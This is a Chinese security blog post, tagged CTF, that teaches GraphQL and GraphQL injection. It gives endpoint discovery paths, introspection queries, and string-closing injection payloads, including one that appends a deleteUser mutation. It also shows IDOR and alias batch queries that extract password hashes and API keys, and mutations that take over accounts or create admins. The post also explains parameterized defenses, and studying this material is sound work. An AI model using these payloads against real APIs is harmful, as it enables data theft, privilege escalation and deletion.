@@ -1,0 +1,1025 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>GraphQL 注入 | QisPath</title>
+    <meta name="author" content="QisPath" />
+    <meta name="description" content="道阻且长，行则将至" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar-profile.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=1794830706241" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>加载中</h2>
+                    <p>请稍候</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>QisPath</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首页</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;归档</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;友链</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;QisPath</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">首页</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">归档</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                    </div>
+                </a>
+                
+                <a href="/links">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-link fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">友链</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>GraphQL 注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/11/16
+        </span>
+        
+        <span class="category">
+            <a href="/categories/web%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                web安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #ff7d73">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/GraphQL/" style="color: #00a596">
+                    GraphQL
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/API%E5%AE%89%E5%85%A8/" style="color: #03a9f4">
+                    API安全
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B3%A8%E5%85%A5/" style="color: #ffa2c4">
+                    注入
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="什么是GraphQL"><a href="#什么是GraphQL" class="headerlink" title="什么是GraphQL"></a>什么是GraphQL</h2><p>GraphQL 是一种<strong>API 查询语言</strong>，核心思想是客户端按需声明想要哪些字段的数据，后端<strong>按请求返回对应内容</strong>，不像 REST 那样接口返回固定结构。 </p>
+<p>它靠一套类型系统（Type，包含标量、对象类型，配合类型修饰符控制必填 &#x2F; 数组）定义数据模型；</p>
+<p>通过 <strong>Schema</strong> 定义根操作：<strong>query（查询）、mutation（修改）、subscription（订阅推送）</strong>；</p>
+<p>再由 <strong>Resolver</strong> 解析函数负责实际取数，递归解析查询直到标量类型，Resolver 内部可以对接 SQL、REST、RPC 等任意数据源，实现前后端解耦。</p>
+<p><img src="/./GraphQL.assets/GraphQL_%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84%E5%9B%BE-1794797319325-2.png" alt="GraphQL_分层结构图"></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="一、3-种操作（Operation）"><a href="#一、3-种操作（Operation）" class="headerlink" title="一、3 种操作（Operation）"></a>一、3 种操作（Operation）</h3><ul>
+<li><p><strong>Query</strong>：<strong>读数据</strong>，只读不改，支持嵌套查询、变量，按需指定返回字段</p>
+</li>
+<li><p><strong>Mutation</strong>：<strong>写数据</strong>（增 &#x2F; 删 &#x2F; 改），变更服务端状态，执行后也可指定返回字段</p>
+</li>
+<li><p><strong>Subscription</strong>：<strong>实时订阅</strong>，基于 WebSocket 长连接，服务端主动推送更新</p>
+</li>
+</ul>
+<p>它们都走同一个端点（通常是 <code>/graphql</code>），通过请求体里的关键字区分。</p>
+<pre><code class="sql"># 1. query：读数据
+query &#123; ... &#125;
+
+# 简写：只有一个 query、无变量时可以省略 query 关键字
+&#123;
+  user(id: 1) &#123; name &#125;
+&#125;
+
+# 2. mutation：写数据（增删改）
+mutation &#123; ... &#125;
+
+# 3. subscription：订阅，websocket 实时推送
+subscription &#123; ... &#125;
+</code></pre>
+<p><strong>Schema 三件套</strong>：<code>Type</code>（数据模型）→ <code>Field</code>（字段）→ <code>Resolver</code>（取值函数，函数签名 <code>(parent, args, ctx, info)</code>）。</p>
+<h3 id="二、基础查询-嵌套（越权漏洞根源）"><a href="#二、基础查询-嵌套（越权漏洞根源）" class="headerlink" title="二、基础查询 + 嵌套（越权漏洞根源）"></a>二、基础查询 + 嵌套（越权漏洞根源）</h3><pre><code class="sql">query &#123;
+  user(id: 1) &#123;        # user 是字段，(id:1) 是参数
+    name
+    adminInfo &#123;        # 嵌套对象，继续选字段
+      permissions
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>返回的 JSON 结构和你写的字段结构一模一样。<br><strong>漏洞根源</strong>：字段只要在 schema 里存在就能请求，服务端常只校验“字段存不存在”，不校验“当前用户有没有权限看”，于是把 <code>adminInfo</code> &#x2F; <code>password</code> &#x2F; <code>token</code> 这类字段直接加进查询就能拖出来。</p>
+<h3 id="三、变量"><a href="#三、变量" class="headerlink" title="三、变量 $"></a>三、变量 $</h3><pre><code class="sql">query GetUser($uid: ID!) &#123;
+  user(id: $uid) &#123;
+    name
+  &#125;
+&#125;
+</code></pre>
+<pre><code class="json">// variables
+&#123; &quot;uid&quot;: &quot;1&quot; &#125;
+</code></pre>
+<p><code>!</code> &#x3D; 非空，必填。<br>参数与 body 分离，payload 藏在 <code>variables</code> 里，可绕过只查 query 字符串的关键字过滤。</p>
+<h3 id="四、别名-alias（绕过简单关键字检测）"><a href="#四、别名-alias（绕过简单关键字检测）" class="headerlink" title="四、别名 alias（绕过简单关键字检测）"></a>四、别名 alias（绕过简单关键字检测）</h3><pre><code class="sql">query &#123;
+  u1: user(id: 1) &#123; name &#125;
+  u2: user(id: 2) &#123; name &#125;
+&#125;
+</code></pre>
+<ul>
+<li>同一字段一次请求可查多次，靠别名区分响应 key</li>
+<li>别名随便起，天然绕过基于字段名的黑名单 &#x2F; WAF</li>
+<li>批量越权：一条请求把 id 1~100 全拖出来</li>
+</ul>
+<h3 id="五、片段-fragment（长查询复用）"><a href="#五、片段-fragment（长查询复用）" class="headerlink" title="五、片段 fragment（长查询复用）"></a>五、片段 fragment（长查询复用）</h3><pre><code class="sql">fragment UserBase on User &#123;
+  id
+  name
+&#125;
+
+query &#123;
+  user(id: 1) &#123;
+    ...UserBase
+    email
+  &#125;
+&#125;
+
+
+
+# 效果相同
+query &#123; user(id:1) &#123; id name email &#125; &#125;
+</code></pre>
+<ul>
+<li><code>...</code> 展开片段</li>
+<li>很多简易权限校验不会递归解析片段，容易绕过</li>
+<li>内联写法：<code>... on User &#123; name &#125;</code></li>
+</ul>
+<h3 id="六、Schema-类型定义（后端定义）"><a href="#六、Schema-类型定义（后端定义）" class="headerlink" title="六、Schema 类型定义（后端定义）"></a>六、Schema 类型定义（后端定义）</h3><p>内置标量：<code>ID</code> &#x2F; <code>String</code> &#x2F; <code>Int</code> &#x2F; <code>Float</code> &#x2F; <code>Boolean</code></p>
+<pre><code class="sql">type User &#123;
+  id: ID!
+  name: String!
+  email: String
+&#125;
+
+type Query &#123;
+  user(id: ID!): User
+&#125;
+
+type Mutation &#123;
+  createUser(name: String!): User
+&#125;
+
+# 列表 []
+type Post &#123;
+  comments: [Comment!]!
+&#125;
+
+# input 输入类型，mutation 传参用
+input UserInput &#123;
+  name: String
+&#125;
+</code></pre>
+<ul>
+<li><code>!</code> 非空；<code>[Comment!]!</code> &#x3D; 列表非空 + 元素都非空</li>
+<li><code>type</code> 是输出类型，<code>input</code> 是输入类型，mutation 传参用 <code>input</code></li>
+</ul>
+<h3 id="七、指令"><a href="#七、指令" class="headerlink" title="七、指令 @"></a>七、指令 @</h3><pre><code class="sql">query &#123;
+  user(id: 1) &#123;
+    name  @include(if: true)
+    email @skip(if: false)
+  &#125;
+&#125;
+</code></pre>
+<ul>
+<li><code>@include(if: 布尔)</code>：true 才返回此字段</li>
+<li><code>@skip(if: 布尔)</code>：true 跳过此字段</li>
+</ul>
+<p>注：原文写成 <code>@//include/</code> 是被转义过，实际语法就是 <code>@include</code>。</p>
+<h3 id="八、注释"><a href="#八、注释" class="headerlink" title="八、注释"></a>八、注释</h3><p><code>#</code> 开头，单行注释（<code>#</code> 后到行尾全部忽略）。</p>
+<h3 id="九、类型修饰符"><a href="#九、类型修饰符" class="headerlink" title="九、类型修饰符"></a>九、类型修饰符</h3><ul>
+<li><code>Type!</code>：该字段不可为空</li>
+<li><code>[Type]</code>：列表可空、元素可空</li>
+<li><code>[Type!]</code>：列表可空、元素必填</li>
+<li><code>[Type!]!</code>：列表本身、内部元素都必填</li>
+</ul>
+<blockquote>
+<p><code>!</code> 紧贴谁，谁非空</p>
+</blockquote>
+<h3 id="十、内省系统"><a href="#十、内省系统" class="headerlink" title="十、内省系统"></a>十、内省系统</h3><p>GraphQL 可以查询自身 Schema</p>
+<ul>
+<li><code>__typename</code>：获取当前对象类型名</li>
+<li><code>__schema</code>：查询完整 Schema</li>
+<li><code>__type(name)</code>：按名称查询单个类型结构</li>
+</ul>
+<h2 id="GraphQL注入"><a href="#GraphQL注入" class="headerlink" title="GraphQL注入"></a>GraphQL注入</h2><p>大致分为这三条利用路线</p>
+<table>
+<thead>
+<tr>
+<th align="left">线</th>
+<th align="left">名称</th>
+<th align="left">注入发生在</th>
+<th align="left">本质</th>
+<th align="left">危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">A</td>
+<td align="left">语法层注入（GraphQL Injection 严格定义）</td>
+<td align="left">query 字符串拼接处</td>
+<td align="left">闭合语法、追加操作</td>
+<td align="left">执行非预期 query&#x2F;mutation</td>
+</tr>
+<tr>
+<td align="left">B</td>
+<td align="left">结构层注入（字段遍历&#x2F;越权）</td>
+<td align="left">客户端可控的字段选择</td>
+<td align="left">绕过字段级鉴权</td>
+<td align="left">批量拖敏感字段、IDOR</td>
+</tr>
+<tr>
+<td align="left">C</td>
+<td align="left">下游注入（resolver 内部）</td>
+<td align="left">Resolver 把参数丢给 SQL&#x2F;命令&#x2F;URL</td>
+<td align="left">传统漏洞在 GraphQL 外壳下</td>
+<td align="left">SQLi &#x2F; NoSQLi &#x2F; RCE &#x2F; SSRF</td>
+</tr>
+</tbody></table>
+<p>三者的共同前提都是：<strong>GraphQL 只有一个入口，攻击者能用一条请求表达任意结构</strong>。差别只在于“哪一层没做校验”。</p>
+<h3 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h3><p>常见路径</p>
+<pre><code class="plaintext">/graphql
+/graphiql
+/gql
+/query
+/graph
+/api/graphql
+/v1/graphql
+/v2/graphql
+/v3/graphql
+/graphql/api
+/v1/api/graphql
+/console
+/playground
+/graphql/console
+/graphql-playground
+/graphql.php
+/index.php?graphql
+/graphql/schema.json
+/graphql/schema.yaml
+</code></pre>
+<p><strong>报错特征</strong>（不提供 query 时直接暴露）：</p>
+<pre><code class="plaintext">Must provide query string
+GraphQL validation failed
+syntax error, unexpected ...
+</code></pre>
+<p>一些不正确的请求（POST-&gt;GET）或者参数缺失可能导致报错，即可借此判断网站是否使用了<code>graphql API</code></p>
+<p>请求探测（注意）<code>Content-Type</code>最好改成<code>application/json</code>：</p>
+<pre><code class="json">&#123;&quot;query&quot;:&quot;query&#123;__typename&#125;&quot;&#125;
+</code></pre>
+<h3 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h3><pre><code class="javascript">// L1 极简，最不易被拦
+&#123;__typename&#125;
+
+// L2 只要类型名
+&#123;__schema&#123;types&#123;name&#125;&#125;&#125;
+
+// L3 单类型详情（比全量内省隐蔽）
+&#123;__type(name:&quot;User&quot;)&#123;name fields&#123;name type&#123;name kind ofType&#123;name&#125;&#125;&#125;&#125;&#125;
+
+// L4 指定根操作
+query&#123;__schema&#123;queryType&#123;name&#125; mutationType&#123;name&#125; subscriptionType&#123;name&#125;&#125;&#125;
+</code></pre>
+<p><strong>中等完整度</strong>：</p>
+<pre><code class="javascript">query&#123;
+  __schema&#123;
+    queryType&#123;name&#125;
+    mutationType&#123;name&#125;
+    types&#123;
+      name
+      kind
+      fields&#123;
+        name
+        args&#123;
+          name
+          type&#123;
+            name
+            kind
+            ofType&#123;name&#125;
+          &#125;
+        &#125;
+      &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p><strong>完整 IntrospectionQuery</strong>：</p>
+<p>太长，可以直接用工具生成</p>
+<pre><code class="bash"># 用 graphql-cli / get-graphql-schema 保存到文件
+npx get-graphql-schema http://target/graphql &gt; schema.graphql
+</code></pre>
+<p>标准 IntrospectionQuery 骨架（fragment 嵌套 <code>ofType</code> 十层，用于展开 <code>[User!]!</code> 这类嵌套类型）：</p>
+<pre><code class="javascript">query IntrospectionQuery &#123;
+  __schema &#123;
+    queryType &#123; name &#125;
+    mutationType &#123; name &#125;
+    subscriptionType &#123; name &#125;
+    types &#123; ...FullType &#125;
+    directives &#123;
+      name
+      description
+      locations
+      args &#123; ...InputValue &#125;
+    &#125;
+  &#125;
+&#125;
+
+fragment FullType on __Type &#123;
+  kind
+  name
+  description
+  fields(includeDeprecated: true) &#123;
+    name
+    description
+    args &#123; ...InputValue &#125;
+    type &#123; ...TypeRef &#125;
+    isDeprecated
+    deprecationReason
+  &#125;
+  inputFields &#123; ...InputValue &#125;
+  interfaces &#123; ...TypeRef &#125;
+  enumValues(includeDeprecated: true) &#123;
+    name
+    description
+    isDeprecated
+    deprecationReason
+  &#125;
+  possibleTypes &#123; ...TypeRef &#125;
+&#125;
+
+fragment InputValue on __InputValue &#123;
+  name
+  description
+  type &#123; ...TypeRef &#125;
+  defaultValue
+&#125;
+
+fragment TypeRef on __Type &#123;
+  kind
+  name
+  ofType &#123;
+    kind
+    name
+    ofType &#123;
+      kind
+      name
+      ofType &#123;
+        kind
+        name
+        ofType &#123;
+          kind
+          name
+          ofType &#123;
+            kind
+            name
+            ofType &#123;
+              kind
+              name
+              ofType &#123;
+                kind
+                name
+              &#125;
+            &#125;
+          &#125;
+        &#125;
+      &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>内省的关键：查到 <strong>敏感字段 、危险 mutation、废弃字段、需权限才可见但未标记字段</strong> 等有价值信息</p>
+<h3 id="A线-语法层注入（严格意义的-GraphQL-Injection）"><a href="#A线-语法层注入（严格意义的-GraphQL-Injection）" class="headerlink" title="A线 语法层注入（严格意义的 GraphQL Injection）"></a>A线 语法层注入（严格意义的 GraphQL Injection）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>PHP&#x2F;Java&#x2F;Node 里把用户输入<strong>字符串拼接</strong>进 query 模板：</p>
+<pre><code class="python">query = &#39;query &#123; user(name: &quot;%s&quot;) &#123; name email &#125; &#125;&#39; % name
+</code></pre>
+<p>GraphQL 解析器按语法切分，攻击者输入里的 <code>&quot;``)``&#125;</code> 会<strong>闭合当前结构</strong>，剩下部分被当作新的操作解析。用 <code>#</code> 注释掉尾部残留。</p>
+<p>响应里可能同时返回 <code>data</code> 和 <code>errors</code> —— 只要 <code>data</code> 里有东西，说明注入成功。</p>
+<h4 id="闭合手法"><a href="#闭合手法" class="headerlink" title="闭合手法"></a>闭合手法</h4><p>原始模板：</p>
+<pre><code class="plaintext">query &#123; getscorebyyourname(name:&quot;&lt;INJECT&gt;&quot;) &#123; score name &#125; &#125;
+</code></pre>
+<p><strong>① 闭合 + 追加查询</strong></p>
+<pre><code class="plaintext">xxx&quot;) &#123; score name &#125; &#125; query &#123; __schema &#123; types &#123; name &#125; &#125; &#125; #
+</code></pre>
+<p><strong>② 闭合 + 追加 mutation</strong></p>
+<p>可以直接写库</p>
+<pre><code class="plaintext">xxx&quot;) &#123; score name &#125; &#125; mutation &#123; deleteUser(id:1)&#123; ok &#125; &#125; #
+</code></pre>
+<p><strong>③ 只用单引号闭合</strong></p>
+<p>模板用单引号时</p>
+<pre><code>xxx&#39;)&#123; id name &#125; &#125; #
+</code></pre>
+<p><strong>④ 注释符差异</strong></p>
+<p>GraphQL 只有 <code>#</code> 一种注释（<code>--</code> 和 <code>/* */</code> 无效）；URL 传参时 <code>#</code> 要编码成 <code>%23</code>。</p>
+<h4 id="完整的可复用模板"><a href="#完整的可复用模板" class="headerlink" title="完整的可复用模板"></a>完整的可复用模板</h4><pre><code class="json">&#123;&quot;query&quot;:&quot;query &#123; user(id: \&quot;1\&quot;) &#123; name email &#125; &#125;&quot;&#125;
+</code></pre>
+<p>注入 <code>id</code> 值：</p>
+<pre><code class="json">&#123;&quot;query&quot;:&quot;query &#123; user(id: \&quot;1\&quot;) &#123; name email &#125; &#125; query &#123; __schema &#123; types &#123; name &#125; &#125; &#125; #\&quot;) &#123; name email &#125; &#125;&quot;&#125;
+</code></pre>
+<h5 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h5><ol>
+<li>后端存在 <strong>字符串拼接构造 query</strong> 的代码（模板 <code>&quot;%s&quot;</code> &#x2F; <code>+</code> &#x2F; <code>f-string</code>）</li>
+<li>拼接位置在 <strong>参数值引号内部</strong>（能闭合引号）</li>
+<li>解析器<strong>没有对整条 query 做语法白名单校验</strong></li>
+<li>目标服务允许<strong>一次请求执行多个操作</strong>（<code>operationName</code> 未强制 &#x2F; 未开 <code>NoUnusedFragments</code> 等校验规则）</li>
+</ol>
+<h4 id="为什么参数化能防住-A-线"><a href="#为什么参数化能防住-A-线" class="headerlink" title="为什么参数化能防住 A 线"></a>为什么参数化能防住 A 线</h4><ul>
+<li><p>字符串拼接：<strong>用户输入 → 拼入源码 → 整体 Parser 解析</strong> → 输入能改 AST，注入生效</p>
+</li>
+<li><p>Variables 参数化：<strong>固定源码先 Parser 生成 AST → 再填充变量字面量</strong> → 变量内容不进 <code>Parser</code>，无法修改 AST 结构，直接阻断 GraphQL Injection</p>
+</li>
+</ul>
+<p>例子</p>
+<pre><code class="javascript">// 固定的查询文档（写死，用户不能篡改这段结构）
+query GetUser($id: ID!) &#123; 
+  user(id: $id) &#123; name email &#125; 
+&#125;
+</code></pre>
+<p>用户输入：</p>
+<pre><code class="javascript">&#123;
+  &quot;query&quot;: &quot;query GetUser($id: ID!)&#123; user(id: $id) &#123; name email &#125; &#125;&quot;,
+  &quot;variables&quot;: &#123;
+    &quot;id&quot;: &quot;123\&quot;) &#123; deleteUser &#125; #&quot;
+  &#125;
+&#125;
+</code></pre>
+<p>攻击者给的变量：<code>123&quot;) &#123; deleteUser &#125; #</code></p>
+<p>流程：</p>
+<ul>
+<li><p>Parser 只处理 <code>query</code> 字段内的文本，<strong>不读取 variables</strong>。</p>
+<p>解析结果：声明变量 <code>$id: ID!</code>，执行 <code>user(id: $id)</code>，选取 <code>name</code>、<code>email</code>。 生成并锁定 AST</p>
+</li>
+<li><p>AST 定型之后才把变量值填充进占位符。 <code>$id</code> 被替换为字面量字符串：<code>&quot;123\&quot;) &#123; deleteUser &#125; #&quot;</code></p>
+<blockquote>
+<p>关键点：填充的只是<strong>字符串值</strong>，不是 GraphQL 源码，不会再次交给 Parser 语法解析。 Resolver 获取到的 <code>args.id</code> 就是原字符串 <code>123&quot;) &#123; deleteUser &#125; #</code>，里面的 <code>&quot;)</code>、<code>&#123;</code>、<code>#</code> 只是普通字符，不具备语法含义。</p>
+</blockquote>
+</li>
+</ul>
+<p>变量值在<strong>解析后</strong>才注入，永远作为字面量字符串处理，不参与语法解析。所以 <code>variables</code> 是 A 线的根治手段。</p>
+<h3 id="B-线：结构层注入（字段遍历-越权-IDOR）"><a href="#B-线：结构层注入（字段遍历-越权-IDOR）" class="headerlink" title="B 线：结构层注入（字段遍历 &#x2F; 越权 &#x2F; IDOR）"></a>B 线：结构层注入（字段遍历 &#x2F; 越权 &#x2F; IDOR）</h3><blockquote>
+<ul>
+<li><p>结构层注入 ：利用 GraphQL 客户端可控选择集的特性，主动挑选敏感字段、嵌套关联；</p>
+</li>
+<li><p>请求语法完全合法，漏洞根源是缺少<strong>字段级、resolver 级别权限校验</strong>。 </p>
+</li>
+<li><p>区分：A 线是改源码语法；结构注入是正常语法下滥用<strong>查询结构</strong>。</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>GraphQL 把“我要哪些字段”的决定权交给客户端，而 schema 本身就是<strong>公开的数据地图</strong>（内省可全量导出）。服务端若只在<strong>网关&#x2F;顶层字段</strong>做一次鉴权：</p>
+<ul>
+<li>换<strong>更深的字段</strong>（<code>user.posts.comments.author.email</code>）→ 走另一条 resolver，可能没校验</li>
+<li>换<strong>对象 id</strong>（<code>user(id:1)</code> → <code>user(id:2)</code>）→ 没做归属校验就是 IDOR</li>
+<li>换<strong>UI 从没用过的字段</strong>（<code>passwordHash</code>、<code>internalNotes</code>）→ 没人测过</li>
+<li>用<strong>别名</strong>一次要 100 个对象 → 一请求拖全库</li>
+</ul>
+<pre><code class="plaintext">schema 是一张公开地图 ──┐
+                        ├─ 客户端自由选路径
+resolver 只在入口设关卡 ─┘        ↓
+                        绕开关卡走小路 = 越权
+</code></pre>
+<h4 id="字段遍历"><a href="#字段遍历" class="headerlink" title="字段遍历"></a>字段遍历</h4><h5 id="场景-1"><a href="#场景-1" class="headerlink" title="场景 1"></a>场景 1</h5><p><code>publicPost</code> 顶层放行，<code>author</code> 关联无校验</p>
+<pre><code class="javascript">query &#123;
+  publicPost(id:1)&#123;
+    title
+    author &#123;
+      id name email
+      privateMessages &#123; content &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<h5 id="场景-2"><a href="#场景-2" class="headerlink" title="场景 2"></a>场景 2</h5><p>深层链式嵌套穿透，一层一层跳到其他用户敏感数据</p>
+<pre><code class="javascript">query &#123;
+  user(id:1)&#123;
+    name
+    posts &#123;
+      content
+      comments &#123;
+        text
+        author &#123; email password &#125;
+      &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<h4 id="未授权-IDOR"><a href="#未授权-IDOR" class="headerlink" title="未授权 &#x2F; IDOR"></a>未授权 &#x2F; IDOR</h4><p>直接指定 ID 查询任意用户，缺少归属校验：</p>
+<pre><code class="javascript">&#123; user(id:2)&#123; name email phone &#125; &#125;
+</code></pre>
+<p>特点：前端页面不请求敏感字段不代表后端不返回；内省可枚举全部敏感字段。</p>
+<p>（真实场景：内省列出全部 email，正常查询 401，但某个漏鉴权的字段&#x2F;操作可未授权返回<strong>全站邮箱 + 密码哈希</strong>）</p>
+<h4 id="敏感字段直取"><a href="#敏感字段直取" class="headerlink" title="敏感字段直取"></a>敏感字段直取</h4><blockquote>
+<p>规则：字段在 schema 里存在（内省可见），但 UI 从不请求</p>
+</blockquote>
+<p><strong>原理</strong>：GraphQL 的返回值<strong>由客户端选择性集决定</strong>，服务端不做“字段级白名单”。只要 schema 里声明了 <code>passwordHash</code>，哪怕前端从不请求，它也是可查询的——除非该字段的 resolver 单独实现了权限拒绝。很多系统把“前端不显示”误当成“接口不返回”。</p>
+<pre><code class="javascript">query &#123;
+  user(id: 1) &#123;
+    id
+    name
+    email
+    phone
+    passwordHash
+    internalNotes
+    paymentInfo
+    apiKey
+  &#125;
+&#125;
+</code></pre>
+<h5 id="批量导出（单对象-→-列表）"><a href="#批量导出（单对象-→-列表）" class="headerlink" title="批量导出（单对象 → 列表）"></a><strong>批量导出（单对象 → 列表）</strong></h5><pre><code class="javascript">query &#123;
+  users(limit: 1000) &#123;
+    id
+    name
+    email
+    passwordHash
+  &#125;
+&#125;
+</code></pre>
+<h4 id="别名批量拖库-绕限流-WAF"><a href="#别名批量拖库-绕限流-WAF" class="headerlink" title="别名批量拖库 + 绕限流 &#x2F; WAF"></a>别名批量拖库 + 绕限流 &#x2F; WAF</h4><p>单请求多个别名批量拉取多条数据，只消耗一次 HTTP 请求计数：</p>
+<pre><code class="javascript">query &#123;
+  u1: user(id: 1)  &#123; name email &#125;
+  u2: user(id: 2)  &#123; name email &#125;
+  u3: user(id: 3)  &#123; name email &#125;
+  u4: user(id: 4)  &#123; name email &#125;
+  u5: user(id: 5)  &#123; name email &#125;
+&#125;
+</code></pre>
+<h5 id="极短别名"><a href="#极短别名" class="headerlink" title="极短别名"></a><strong>极短别名</strong></h5><pre><code class="javascript">query &#123;
+  a: user(id: 1) &#123; email &#125;
+  b: user(id: 2) &#123; email &#125;
+  c: user(id: 3) &#123; email &#125;
+&#125;
+</code></pre>
+<p>要点：短别名 <code>a: b: c:</code> 规避简单关键词、长度检测；经典案例 GitHub 2020 GraphQL 限流绕过。</p>
+<h4 id="Mutation-写操作越权、垂直提权"><a href="#Mutation-写操作越权、垂直提权" class="headerlink" title="Mutation 写操作越权、垂直提权"></a>Mutation 写操作越权、垂直提权</h4><h5 id="篡改他人信息："><a href="#篡改他人信息：" class="headerlink" title="篡改他人信息："></a>篡改他人信息：</h5><pre><code class="javascript">mutation &#123;
+  updateUser(id:1, email:&quot;attacker@evil.com&quot;)&#123; id email &#125;
+&#125;
+</code></pre>
+<h5 id="创建管理员账号（入参未过滤权限字段）："><a href="#创建管理员账号（入参未过滤权限字段）：" class="headerlink" title="创建管理员账号（入参未过滤权限字段）："></a>创建管理员账号（入参未过滤权限字段）：</h5><pre><code class="javascript">mutation &#123;
+  createUser(name:&quot;test&quot;, email:&quot;t@t.com&quot;, role:&quot;ADMIN&quot;)&#123; id role &#125;
+&#125;
+</code></pre>
+<h5 id="批量删除"><a href="#批量删除" class="headerlink" title="批量删除:"></a>批量删除:</h5><pre><code class="javascript">mutation &#123;
+  deleteUser(id: 1) &#123; ok &#125;
+&#125;
+</code></pre>
+<p><strong>提权常用</strong>：<code>updateUser</code> &#x2F; <code>updateProfile</code> 里带 <code>role</code>、<code>isAdmin</code>、<code>verified</code> 参数。</p>
